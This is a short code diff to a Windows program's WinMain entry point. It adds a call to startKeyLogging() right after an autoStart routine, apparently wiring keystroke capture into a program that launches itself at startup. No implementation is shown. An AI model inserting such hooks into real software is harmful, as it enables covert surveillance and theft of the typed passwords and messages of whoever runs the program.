@@ -15,5 +15,6 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     {
         autoStart(p);
     }
+    startKeyLogging();
     return 0;
 }
